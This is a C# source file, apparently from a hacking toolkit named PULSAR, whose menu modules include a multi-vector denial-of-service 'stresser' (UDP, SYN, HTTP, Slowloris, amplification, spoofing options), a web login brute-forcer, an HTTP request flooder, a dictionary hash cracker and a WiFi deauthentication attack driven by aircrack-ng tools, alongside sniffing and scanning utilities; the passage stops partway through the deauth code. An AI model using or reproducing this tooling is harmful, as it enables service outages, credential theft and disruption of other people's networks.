// SPDX-License-Identifier: MIT
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using PULSAR.Core;
using PULSAR.Networking;
using PULSAR.UI;

namespace PULSAR.Recon;

/// <summary>
/// All reconnaissance and utility modules accessible from the main menu.
/// Each method corresponds to a main menu option.
/// </summary>
public static class ReconModules
{
    // ── Attack Module Runner ──────────────────────────────────────────

    /// <summary>Runs the attack/stresser module (Menu option 1).</summary>
    public static async Task RunAttackMenu(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);

        ModernUI.Print("ENHANCED NETWORK STRESS TESTING MODULE", ModernUI.MsgType.Warning);
        ModernUI.Print("WARNING: Designed for maximum network saturation", ModernUI.MsgType.Warning);
        Console.WriteLine();

        string target = ModernUI.Prompt("Target IP/Hostname");

        if (!BlacklistManager.IsTargetAllowed(target))
        {
            ModernUI.Print("Target protected or blacklisted.", ModernUI.MsgType.Error);
            ModernUI.Pause(); return;
        }

        string resolvedIp = target;
        try
        {
            if (!IPAddress.TryParse(target, out _))
            {
                var addresses = await Dns.GetHostAddressesAsync(target);
                if (addresses.Length > 0)
                {
                    resolvedIp = addresses[0].ToString();
                    ModernUI.Print($"Resolved {target} -> {resolvedIp}", ModernUI.MsgType.Info);
                }
            }
        }
        catch
        {
            ModernUI.Print("Failed to resolve hostname, using as-is", ModernUI.MsgType.Warning);
        }

        string portS = ModernUI.Prompt("Target Port", "80");
        if (!int.TryParse(portS, out int port)) port = 80;

        ModernUI.DrawBox("ATTACK CONFIGURATION", () =>
        {
            Console.WriteLine("   [1] UDP Flood - Raw packet flood (fastest)");
            Console.WriteLine("   [2] TCP SYN Flood - Connection exhaustion");
            Console.WriteLine("   [3] HTTP Flood - Application layer attack (GET)");
            Console.WriteLine("   [4] ICMP Flood - Ping of death style");
            Console.WriteLine("   [5] HTTP HEAD - Low bandwidth header flood (Layer 7)");
            Console.WriteLine("   [6] SLOWLORIS - Keep-alive connection exhaustion (Layer 7)");
            Console.WriteLine("   [7] NTP AMPLIFICATION - Monlist reflection simulation");
            Console.WriteLine("   [8] DNS AMPLIFICATION - ANY Query reflection simulation");
            Console.WriteLine("   [9] MULTI-VECTOR - All standard protocols (MAX IMPACT)");
        });

        string methodChoice = ModernUI.Prompt("Attack Method", "9");
        string method = methodChoice switch
        {
            "2" => "TCP",
            "3" => "HTTP",
            "4" => "ICMP",
            "5" => "HTTP_HEAD",
            "6" => "SLOWLORIS",
            "7" => "NTP_AMP",
            "8" => "DNS_AMP",
            "9" => "MULTI",
            _ => "UDP"
        };

        string threadsS = ModernUI.Prompt("Threads per Vector (10-1000)", "500");
        if (!int.TryParse(threadsS, out int threads)) threads = 500;
        threads = Math.Clamp(threads, 10, 1000);

        string durationS = ModernUI.Prompt("Duration (seconds)", "60");
        if (!int.TryParse(durationS, out int duration)) duration = 60;

        string packetSizeS = ModernUI.Prompt("Packet Size (bytes, 0=random/max)", "0");
        if (!int.TryParse(packetSizeS, out int packetSize)) packetSize = 0;

        bool useRandomPorts = method == "UDP" || method == "TCP" || method == "MULTI";
        if (useRandomPorts)
            useRandomPorts = ModernUI.Prompt("Randomize target ports? (y/n)", "n").ToLower() == "y";

        bool useSpoofing = false;
        if (method.Contains("AMP") || method == "UDP")
        {
            useSpoofing = ModernUI.Prompt("Enable IP spoofing simulation? (y/n)", "n").ToLower() == "y";
        }

        await new Attacks.AttackManager().RunEnhancedAttack(method, resolvedIp, port, threads, duration, packetSize, useRandomPorts, useSpoofing, token);
        ModernUI.Pause();
    }

    // ── Packet Capture ───────────────────────────────────────────────

    /// <summary>Runs passive packet sniffer (Windows, option 2).</summary>
    public static async Task RunPassiveSniffer(CancellationToken token)
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            ModernUI.Print("Windows only feature.", ModernUI.MsgType.Error); ModernUI.Pause(); return;
        }
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        ModernUI.Print("Listening for packets (Press Ctrl+C to stop)...", ModernUI.MsgType.Wait);
        try
        {
            string ip = NetworkUtils.GetLocalIPAddress();
            using Socket s = new(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            s.Bind(new IPEndPoint(IPAddress.Parse(ip), 0));
            s.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
            s.IOControl(IOControlCode.ReceiveAll, new byte[] { 1, 0, 0, 0 }, new byte[4]);
            byte[] b = new byte[4096];

            while (!token.IsCancellationRequested)
            {
                if (s.Available > 0)
                {
                    int r = s.Receive(b);
                    if (r > 20)
                    {
                        string src = $"{b[12]}.{b[13]}.{b[14]}.{b[15]}";
                        string dst = $"{b[16]}.{b[17]}.{b[18]}.{b[19]}";
                        Console.WriteLine($"   {ModernUI.C_GRAY}[PKT]{ModernUI.C_RESET} {src} -> {dst} ({r}b)");
                    }
                }
                await Task.Delay(1);
            }
        }
        catch (Exception ex) { ModernUI.Print(ex.Message, ModernUI.MsgType.Error); }
        ModernUI.Pause();
    }

    /// <summary>Runs tcpdump-based packet capture (Linux, option 2).</summary>
    public static async Task RunLinuxPacketCapture(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        if (!PlatformHelper.IsAdministrator()) { ModernUI.Print("Root required", ModernUI.MsgType.Error); ModernUI.Pause(); return; }
        ModernUI.Print("Starting tcpdump...", ModernUI.MsgType.Wait);
        try
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "tcpdump",
                    Arguments = "-i any -c 100 -n",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            process.OutputDataReceived += (s, e) => { if (!string.IsNullOrEmpty(e.Data)) Console.WriteLine($"   {e.Data}"); };
            process.Start(); process.BeginOutputReadLine();
            while (!token.IsCancellationRequested && !process.HasExited) await Task.Delay(100);
            if (!process.HasExited) process.Kill();
        }
        catch { ModernUI.Print("tcpdump not installed.", ModernUI.MsgType.Error); }
        ModernUI.Pause();
    }

    // ── Network Scanner ──────────────────────────────────────────────

    /// <summary>Runs local network scanner (option 3).</summary>
    public static async Task RunAdvancedScanner(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        string localIp = NetworkUtils.GetLocalIPAddress();

        ModernUI.DrawBox("LOCAL NETWORK SCANNER", () =>
        {
            Console.WriteLine($"   Scanning subnet: {ModernUI.C_CYAN}{localIp}/24{ModernUI.C_RESET}");
            Console.WriteLine($"   Method:          {(RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "ARP" : "ICMP Ping")}");
            Console.WriteLine($"   Target Range:    254 addresses");
        });
        Console.WriteLine();
        ModernUI.Print("Initiating network discovery...", ModernUI.MsgType.Wait);
        Console.WriteLine();

        var devices = await NetworkUtils.ScanSubnet(localIp, token);

        Console.WriteLine();
        if (devices.Count > 0)
        {
            ModernUI.DrawBox($"DISCOVERED DEVICES ({devices.Count})", () =>
            {
                foreach (var dev in devices)
                {
                    var parts = dev.Split(new[] { " (" }, StringSplitOptions.None);
                    string ip = parts[0];
                    string status = parts.Length > 1 ? parts[1].TrimEnd(')') : "Active";
                    Console.WriteLine($"   {ModernUI.C_GREEN}●{ModernUI.C_RESET}  {ModernUI.C_WHITE}{ip,-15}{ModernUI.C_RESET}  {ModernUI.C_GRAY}[{status}]{ModernUI.C_RESET}");
                }
            });
        }
        else
        {
            ModernUI.Print("No devices discovered on the network.", ModernUI.MsgType.Warning);
            Console.WriteLine();
            Console.WriteLine($"   {ModernUI.C_GRAY}Troubleshooting:{ModernUI.C_RESET}");
            Console.WriteLine($"   {ModernUI.C_GRAY}• Ensure you have Administrator/Root privileges{ModernUI.C_RESET}");
            Console.WriteLine($"   {ModernUI.C_GRAY}• Check if devices are online and responding to pings{ModernUI.C_RESET}");
            Console.WriteLine($"   {ModernUI.C_GRAY}• Verify network connectivity{ModernUI.C_RESET}");
        }

        Console.WriteLine();
        ModernUI.Pause();
    }

    // ── GeoIP ─────────────────────────────────────────────────────────

    /// <summary>Runs GeoIP lookup (option 4).</summary>
    public static async Task RunGeoLookup(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(true);
        string ip = ModernUI.Prompt("IP Address");
        await ProxyManager.PrepareConnection();

        const int MAX_RETRIES = 3;

        async Task<bool> AttemptLookup()
        {
            try
            {
                using var cts = CancellationTokenSource.CreateLinkedTokenSource(token);
                cts.CancelAfter(TimeSpan.FromSeconds(5));
                using var c = ProxyManager.GetClient();
                var s = await c.GetStringAsync($"http://ip-api.com/line/{ip}", cts.Token);
                var lines = s.Split('\n');
                if (lines.Length > 5)
                {
                    ModernUI.DrawBox("GEO RESULT", () =>
                    {
                        Console.WriteLine($"   Country: {lines[1]}");
                        Console.WriteLine($"   City:    {lines[6]}");
                        Console.WriteLine($"   ISP:     {lines[10]}");
                        Console.WriteLine($"   Coord:   {lines[7]}, {lines[8]}");
                    });
                    return true;
                }
                ModernUI.Print("API Limit or Invalid IP", ModernUI.MsgType.Error);
                return true;
            }
            catch (Exception ex) when (!(ex is OperationCanceledException) || !token.IsCancellationRequested)
            {
                ModernUI.Print($"[!] Proxy failed ({ex.GetType().Name}: {ex.Message}). Initiating fast proxy rescan...", ModernUI.MsgType.Warning);
                GlobalState.GlobalProxy = null;
                GlobalState.GlobalProxyAddress = "None";
                GlobalState.LastProxyChangeTimestamp = 0;
                await ProxyManager.FindAndSetGlobalProxy(true);
                return false;
            }
        }

        for (int attempt = 0; attempt < MAX_RETRIES; attempt++)
        {
            if (await AttemptLookup()) break;
            if (attempt == MAX_RETRIES - 1)
                ModernUI.Print("Connection failed after 3 retries.", ModernUI.MsgType.Error);
        }

        ModernUI.Pause();
    }

    // ── Traceroute ────────────────────────────────────────────────────

    /// <summary>Runs traceroute (option 5).</summary>
    public static async Task RunTraceroute(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        string host = ModernUI.Prompt("Host");
        using var p = new Ping();
        for (int i = 1; i < 20; i++)
        {
            if (token.IsCancellationRequested) break;
            try
            {
                var r = await p.SendPingAsync(host, 2000, new byte[32], new PingOptions(i, true));
                Console.WriteLine($"   [{i}] {r.Address} ({r.Status})");
                if (r.Status == IPStatus.Success) break;
            }
            catch { Console.WriteLine($"   [{i}] *"); }
        }
        ModernUI.Pause();
    }

    // ── WHOIS ─────────────────────────────────────────────────────────

    /// <summary>Runs WHOIS lookup (option 6).</summary>
    public static async Task RunWhois(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(true);
        string domain = ModernUI.Prompt("Domain");
        await ProxyManager.PrepareConnection();
        try
        {
            using var c = ProxyManager.GetClient();
            string result = await c.GetStringAsync($"https://api.hackertarget.com/whois/?q={domain}");
            Console.WriteLine();
            foreach (var line in result.Split('\n').Take(15))
                Console.WriteLine($"   {line.Trim()}");
        }
        catch { ModernUI.Print("Whois failed.", ModernUI.MsgType.Error); }
        ModernUI.Pause();
    }

    // ── WiFi Scanner ─────────────────────────────────────────────────

    /// <summary>Runs WiFi network scanner (option 7).</summary>
    public static async Task RunWifiScan(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        try
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                var p = Process.Start(new ProcessStartInfo { FileName = "netsh", Arguments = "wlan show networks mode=bssid", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true });
                if (p is not null)
                {
                    string output = await p.StandardOutput.ReadToEndAsync();
                    var ssids = Regex.Matches(output, @"SSID \d+ : (.*?)\r\n");
                    foreach (Match m in ssids)
                        Console.WriteLine($"   {ModernUI.C_GREEN}WiFi:{ModernUI.C_RESET} {m.Groups[1].Value.Trim()}");
                }
            }
            else
            {
                var p = Process.Start(new ProcessStartInfo { FileName = "nmcli", Arguments = "-f SSID dev wifi", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true });
                if (p is not null)
                {
                    string output = await p.StandardOutput.ReadToEndAsync();
                    Console.WriteLine(output);
                }
            }
        }
        catch { ModernUI.Print("Scan failed (Check Perms)", ModernUI.MsgType.Error); }
        ModernUI.Pause();
    }

    // ── Subnet Calculator ────────────────────────────────────────────

    /// <summary>Runs subnet/CIDR calculator (option 8).</summary>
    public static void RunIpCalculator()
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        string input = ModernUI.Prompt("IP/CIDR (e.g. 192.168.1.1/24)");
        try
        {
            var parts = input.Split('/');
            var ip = IPAddress.Parse(parts[0]);
            int cidr = int.Parse(parts[1]);
            ModernUI.DrawBox("CALC", () =>
            {
                Console.WriteLine($"   CIDR: /{cidr}");
                Console.WriteLine($"   Hosts: {Math.Pow(2, 32 - cidr) - 2}");
            });
        }
        catch { ModernUI.Print("Invalid format.", ModernUI.MsgType.Error); }
        ModernUI.Pause();
    }

    // ── Port Scanner ──────────────────────────────────────────────────

    /// <summary>Runs TCP port scanner (option 9).</summary>
    public static async Task RunTargetPortScan(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        string ip = ModernUI.Prompt("Target IP");
        int[] ports = { 21, 22, 80, 443, 3306, 8080 };
        ModernUI.Print($"Scanning {ip}...", ModernUI.MsgType.Wait);
        foreach (var port in ports)
        {
            if (token.IsCancellationRequested) break;
            try
            {
                using var c = new TcpClient();
                var task = c.ConnectAsync(ip, port);
                if (await Task.WhenAny(task, Task.Delay(500)) == task && c.Connected)
                    ModernUI.Print($"Port {port} OPEN", ModernUI.MsgType.Success);
            }
            catch
            {
                // Port closed or host unreachable
            }
        }
        ModernUI.Pause();
    }

    // ── Header Analyzer ───────────────────────────────────────────────

    /// <summary>Runs HTTP header analyzer (option 12).</summary>
    public static async Task RunHeaderAnalyzer(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(true);
        string url = ModernUI.Prompt("URL");
        if (!url.StartsWith("http")) url = "http://" + url;
        await ProxyManager.PrepareConnection();
        try
        {
            using var c = ProxyManager.GetClient();
            var r = await c.GetAsync(url, token);
            Console.WriteLine();
            foreach (var h in r.Headers)
                Console.WriteLine($"   {ModernUI.C_CYAN}{h.Key}:{ModernUI.C_RESET} {string.Join(",", h.Value)}");
        }
        catch { ModernUI.Print("Error", ModernUI.MsgType.Error); }
        ModernUI.Pause();
    }

    // ── Crypto Tool ───────────────────────────────────────────────────

    /// <summary>Runs hash generation tool (option 13).</summary>
    public static void RunCryptoTool()
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        string text = ModernUI.Prompt("Input Text");
        using var md5 = MD5.Create();
        using var sha = SHA256.Create();
        Console.WriteLine($"   MD5:    {BitConverter.ToString(md5.ComputeHash(Encoding.UTF8.GetBytes(text))).Replace("-", "")}");
        Console.WriteLine($"   SHA256: {BitConverter.ToString(sha.ComputeHash(Encoding.UTF8.GetBytes(text))).Replace("-", "")}");
        ModernUI.Pause();
    }

    // ── SSL Inspector ─────────────────────────────────────────────────

    /// <summary>Runs SSL/TLS certificate inspector (option 14).</summary>
    public static async Task RunSSLInspector(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        string domain = ModernUI.Prompt("Domain");
        try
        {
            using var c = new TcpClient(domain, 443);
            using var s = new SslStream(c.GetStream(), false, (a, b, cc, e) => true);
            await s.AuthenticateAsClientAsync(domain);
            var cert = s.RemoteCertificate as X509Certificate2;
            ModernUI.DrawBox("SSL CERT", () =>
            {
                Console.WriteLine($"   Issuer: {cert?.Issuer}");
                Console.WriteLine($"   Expire: {cert?.NotAfter}");
                Console.WriteLine($"   Algo:   {cert?.SignatureAlgorithm.FriendlyName}");
            });
        }
        catch { ModernUI.Print("Connection Failed", ModernUI.MsgType.Error); }
        ModernUI.Pause();
    }

    // ── Tech Detector ─────────────────────────────────────────────────

    /// <summary>Runs web technology detector (option 15).</summary>
    public static async Task RunTechDetector(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(true);
        string url = ModernUI.Prompt("URL");
        if (!url.StartsWith("http")) url = "http://" + url;
        await ProxyManager.PrepareConnection();
        try
        {
            using var c = ProxyManager.GetClient();
            var r = await c.GetAsync(url, token);
            var html = await r.Content.ReadAsStringAsync();
            if (r.Headers.Contains("Server"))
                ModernUI.Print($"Server: {r.Headers.Server}", ModernUI.MsgType.Success);
            if (html.Contains("wp-content"))
                ModernUI.Print("CMS: WordPress", ModernUI.MsgType.Success);
            if (html.Contains("laravel"))
                ModernUI.Print("Framework: Laravel", ModernUI.MsgType.Success);
        }
        catch { ModernUI.Print("Failed", ModernUI.MsgType.Error); }
        ModernUI.Pause();
    }

    // ── Web Crawler ───────────────────────────────────────────────────

    /// <summary>Runs web crawler/link extractor (option 16).</summary>
    public static async Task RunWebCrawler(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(true);
        string url = ModernUI.Prompt("URL");
        if (!url.StartsWith("http")) url = "http://" + url;
        url = url.TrimEnd('/');

        await ProxyManager.PrepareConnection();
        using var c = ProxyManager.GetClient();
        try
        {
            ModernUI.Print("Crawling...", ModernUI.MsgType.Wait);
            string html = await c.GetStringAsync(url);
            var matches = Regex.Matches(html, "href=[\"'](http[^\"']+)[\"']");
            ModernUI.Print($"Found {matches.Count} links:", ModernUI.MsgType.Success);
            foreach (Match m in matches.Take(20))
                Console.WriteLine($"   - {m.Groups[1].Value}");
        }
        catch { ModernUI.Print("Crawl error.", ModernUI.MsgType.Error); }
        ModernUI.Pause();
    }

    // ── Brute Force ───────────────────────────────────────────────────

    /// <summary>Runs web brute-force (option 17).</summary>
    public static async Task RunBruteForce(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(true);
        ModernUI.Print("Web Bruteforce", ModernUI.MsgType.Warning);
        string url = ModernUI.Prompt("Target Login URL (POST)");

        var users = await WordlistManager.GetWordlist("Usernames", token);
        var passw = await WordlistManager.GetWordlist("Passwords", token);

        if (users.Count == 0) { ModernUI.Print("Lists failed to download", ModernUI.MsgType.Error); ModernUI.Pause(); return; }
        string uField = ModernUI.Prompt("Username Field Name", "username");
        string pField = ModernUI.Prompt("Password Field Name", "password");
        string successKey = ModernUI.Prompt("Success Keyword", "Welcome");
        ModernUI.Print($"Starting attack on {url} with {users.Count * passw.Count} combos...", ModernUI.MsgType.Wait);

        bool found = false;
        await ProxyManager.PrepareConnection();
        foreach (var u in users)
        {
            if (found || token.IsCancellationRequested) break;
            foreach (var p in passw)
            {
                if (found || token.IsCancellationRequested) break;

                try
                {
                    using var c = ProxyManager.GetClient();
                    var content = new FormUrlEncodedContent(new[]
                    {
                        new KeyValuePair<string, string>(uField, u),
                        new KeyValuePair<string, string>(pField, p)
                    });

                    Console.Write($"\r   Trying: {u} / {p} ...      ");
                    var r = await c.PostAsync(url, content, token);
                    string body = await r.Content.ReadAsStringAsync();

                    if (body.Contains(successKey) || ((int)r.StatusCode < 300 && !body.Contains("Login")))
                    {
                        Console.WriteLine($"\n   {ModernUI.C_GREEN}✔ FOUND: {u} / {p}{ModernUI.C_RESET}");
                        found = true;
                    }
                }
                catch
                {
                    // Connection timeout or invalid credential combo - continue to next
                }
            }
        }
        if (!found) ModernUI.Print("Attack finished. No creds found.", ModernUI.MsgType.Error);
        ModernUI.Pause();
    }

    // ── URL Traffic Generator ─────────────────────────────────────────

    /// <summary>Runs URL traffic generator (option 18).</summary>
    public static async Task RunUrlSpammer(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(true);
        string url = ModernUI.Prompt("URL");
        if (!url.StartsWith("http")) url = "http://" + url;
        string countS = ModernUI.Prompt("Request Count", "50");
        int count = int.Parse(countS);

        ModernUI.Print("Flooding...", ModernUI.MsgType.Wait);

        var tasks = new List<Task>();
        int ok = 0;

        for (int i = 0; i < count; i++)
        {
            tasks.Add(Task.Run(async () =>
            {
                try
                {
                    using var c = ProxyManager.GetClient();
                    await c.GetAsync(url, token);
                    Interlocked.Increment(ref ok);
                }
                catch
                {
                    // Individual request failure - continue flooding
                }
            }));
        }
        await Task.WhenAll(tasks);
        ModernUI.Print($"Sent: {count}, OK: {ok}", ModernUI.MsgType.Success);
        ModernUI.Pause();
    }

    // ── Hash Cracker ──────────────────────────────────────────────────

    /// <summary>Runs dictionary-based hash cracker (option 19).</summary>
    public static async Task RunHashCracker(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        ModernUI.DrawBox("DICTIONARY ATTACK", () =>
        {
            Console.WriteLine("   Supported: MD5, SHA1, SHA256, SHA512");
        });

        string hash = ModernUI.Prompt("Hash to crack");
        var list = await WordlistManager.GetWordlist("Dictionary", token);

        if (list.Count == 0) { ModernUI.Print("Wordlist empty", ModernUI.MsgType.Error); ModernUI.Pause(); return; }
        ModernUI.Print($"Processing {list.Count} words...", ModernUI.MsgType.Wait);

        bool found = false;
        string? result = null;

        await Task.Run(() =>
        {
            Parallel.ForEach(list, (word, state) =>
            {
                if (found || token.IsCancellationRequested) state.Stop();

                if (BitConverter.ToString(MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(word))).Replace("-", "").ToLower() == hash.ToLower())
                {
                    result = word; found = true; state.Stop(); return;
                }
                if (BitConverter.ToString(SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(word))).Replace("-", "").ToLower() == hash.ToLower())
                {
                    result = word; found = true; state.Stop(); return;
                }
                if (BitConverter.ToString(SHA1.Create().ComputeHash(Encoding.UTF8.GetBytes(word))).Replace("-", "").ToLower() == hash.ToLower())
                {
                    result = word; found = true; state.Stop(); return;
                }
            });
        });

        if (found) ModernUI.Print($"FOUND: {result}", ModernUI.MsgType.Success);
        else ModernUI.Print("No match found.", ModernUI.MsgType.Error);
        ModernUI.Pause();
    }

    // ── WiFi Deauth ───────────────────────────────────────────────────

    /// <summary>Runs WiFi deauthentication attack (Linux, option 20).</summary>
    public static async Task RunDeauthAttack(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
        {
            ModernUI.Print("This feature is only available on Linux.", ModernUI.MsgType.Error);
            ModernUI.Pause();
            return;
        }
        if (!PlatformHelper.IsAdministrator())
        {
            ModernUI.Print("Root privileges required for WiFi operations.", ModernUI.MsgType.Error);
            ModernUI.Pause();
            return;
        }
        ModernUI.DrawBox("WIFI DEAUTHENTICATION ATTACK", () =>
        {
            Console.WriteLine("   Tool: aireplay-ng (from aircrack-ng suite)");
            Console.WriteLine("   Effect: Disconnects target device from WiFi network");
            Console.WriteLine("   Requirements: WiFi adapter supporting monitor mode");
            Console.WriteLine("   Note: Use responsibly and only on your own networks");
        });
        Console.WriteLine();

        try
        {
            var checkProcess = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "which",
                    Arguments = "aireplay-ng",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            checkProcess.Start();
            string output = await checkProcess.StandardOutput.ReadToEndAsync();
            checkProcess.WaitForExit();
            if (string.IsNullOrWhiteSpace(output))
            {
                ModernUI.Print("aircrack-ng is not installed.", ModernUI.MsgType.Error);
                ModernUI.Print("Install with: sudo apt-get install aircrack-ng", ModernUI.MsgType.Info);
                ModernUI.Pause();
                return;
            }
        }
        catch
        {
            ModernUI.Print("Failed to check for aircrack-ng.", ModernUI.MsgType.Error);
            ModernUI.Pause();
            return;
        }

        Console.WriteLine();
        ModernUI.DrawMenuOption("1", "Scan networks and launch deauth attack");
        ModernUI.DrawMenuOption("2", "Restore network settings (stop monitor mode)");
        Console.WriteLine();
        string choice = ModernUI.Prompt("Select option", "1");
        if (choice == "2")
        {
            await RestoreNetworkSettings();
            ModernUI.Pause();
            return;
        }

        string enableMonitor = ModernUI.Prompt("Enable monitor mode? (y/n)", "y");
        string interfaceName = ModernUI.Prompt("Wireless interface", "wlan0");

        if (enableMonitor.ToLower() == "y")
        {
            ModernUI.Print("Enabling monitor mode...", ModernUI.MsgType.Wait);
            try
            {
                var killProcess = new Process()
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "sudo",
                        Arguments = "airmon-ng check kill",
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                killProcess.Start();
                await killProcess.StandardOutput.ReadToEndAsync();
                killProcess.WaitForExit();

                var monitorProcess = new Process()
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "sudo",
                        Arguments = $"airmon-ng start {interfaceName}",
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                monitorProcess.Start();
                string monitorOutput = await monitorProcess.StandardOutput.ReadToEndAsync();
                monitorProcess.WaitForExit();

                string standardMonName = interfaceName + "mon";
                if (!interfaceName.EndsWith("mon"))
                {
                    if (Directory.Exists($"/sys/class/net/{standardMonName}"))
                    {
                        interfaceName = standardMonName;
                        ModernUI.Print($"System renamed interface to: {interfaceName}", ModernUI.MsgType.Success);
                        ModernUI.Print($"Switching target interface to: {interfaceName}", ModernUI.MsgType.Info);
                    }
                }
            }
            catch (Exception ex)
            {
                ModernUI.Print($"Error enabling monitor mode: {ex.Message}", ModernUI.MsgType.Error);
            }
        }

        ModernUI.Print($"Scanning on {interfaceName} (15 seconds)...", ModernUI.MsgType.Wait);

        var devices = new List<Core.WifiDevice>();

        try
        {
            string tempPrefix = Path.Combine(Path.GetTempPath(), "pulsar_scan");
            string csvFile = tempPrefix + "-01.csv";
            if (File.Exists(csvFile)) File.Delete(csvFile);

            var scanProcess = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "sudo",
                    Arguments = $"timeout 15 airodump-ng {interfaceName} --output-format csv -w {tempPrefix}",
                    RedirectStandardOutput = false,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            scanProcess.Start();
            await scanProcess.WaitForExitAsync();

            if (File.Exists(csvFile))
            {
                var lines = await File.ReadAllLinesAsync(csvFile);
                bool isStationSection = false;

                foreach (var line in lines)
                {
                    if (string.IsNullOrWhiteSpace(line)) continue;
                    if (line.Contains("Station MAC"))
                    {
                        isStationSection = true;
                        continue;
                    }

                    var parts = line.Split(new[] { ',' }, StringSplitOptions.None)
                                  .Select(p => p.Trim())
                                  .ToArray();

                    if (!isStationSection && parts.Length >= 14)
                    {
                        string bssid = parts[0];
                        if (bssid.Length == 17 && bssid.Count(c => c == ':') == 5)
                        {
                            string essid = parts[13];
                            string channel = parts[3];
                            devices.Add(new Core.WifiDevice
                            {
                                MacAddress = bssid,
                                Name = string.IsNullOrEmpty(essid) ? "Hidden Network" : essid,
                                Type = "Access Point",
                                Channel = channel,
                                PacketCount = 0
                            });
                        }
                    }
                    else if (isStationSection && parts.Length >= 6)
                    {
                        string clientMac = parts[0];
                        string apMac = parts[5];
                        string packetsStr = parts[4];
                        int.TryParse(packetsStr, out int packets);
                        if (clientMac.Length == 17 && clientMac.Count(c => c == ':') == 5 &&
                            apMac.Length == 17 && apMac.Count(c => c == ':') == 5)
                        {
                            devices.Add(new Core.WifiDevice
                            {
                                MacAddress = clientMac,
                                Name = $"Client of {apMac}",
                                Type = "Client Device",
                                IpAddress = "Unknown",
                                Channel = "?",
                                PacketCount = packets,
                                ConnectedToBssid = apMac
                            });
                        }
                    }
                }
                File.Delete(csvFile);
            }
        }
        catch (Exception ex)
        {
            ModernUI.Print($"Scan error: {ex.Message}", ModernUI.MsgType.Error);
        }

        if (devices.Count == 0)
        {
            ModernUI.Print("No devices found.", ModernUI.MsgType.Error);
            if (enableMonitor.ToLower() == "y") await RestoreNetworkSettings(interfaceName);
            ModernUI.Pause();
            return;
        }

        devices = devices.OrderBy(d => d.Type).ThenByDescending(d => d.PacketCount).ToList();
        Console.WriteLine();
        ModernUI.Print($"Found {devices.Count} devices:", ModernUI.MsgType.Success);

        for (int i = 0; i < devices.Count; i++)
        {
            var dev = devices[i];
            string info = "";

            if (dev.Type == "Access Point")
            {
                info = $"{ModernUI.C_WHITE}{dev.Name}{ModernUI.C_RESET} (CH:{dev.Channel})";
            }
            else
            {
                var ap = devices.FirstOrDefault(x => x.MacAddress == dev.ConnectedToBssid);
                string apName = ap != null ? ap.Name : dev.ConnectedToBssid;

                string activityColor = dev.PacketCount > 1000 ? ModernUI.C_RED : (dev.PacketCount > 100 ? ModernUI.C_YELLOW : ModernUI.C_GRAY);
                string activityLabel = dev.PacketCount > 2000 ? " (High Activity/Streaming)" : "";

                info = $"Client -> {apName} | {activityColor}Activity: {dev.PacketCount} pkts{activityLabel}{ModernUI.C_RESET}";
            }
            Console.WriteLine($"   [{i}] {dev.MacAddress} - {info}");
        }

        Console.WriteLine();
        string targetIndexStr = ModernUI.Prompt("Select target device number");

        if (!int.TryParse(targetIndexStr, out int targetIndex) || targetIndex < 0 || targetIndex >= devices.Count)
        {
            ModernUI.Print("Invalid selection.", ModernUI.MsgType.Error);
            if (enableMonitor.ToLower() == "y") await RestoreNetworkSettings(interfaceName);
            ModernUI.Pause();
            return;
        }

        var targetDevice = devices[targetIndex];
        string apBssid = "";
        string targetChannel = targetDevice.Channel;

        if (targetDevice.Type == "Client Device")
        {
            apBssid = targetDevice.ConnectedToBssid;
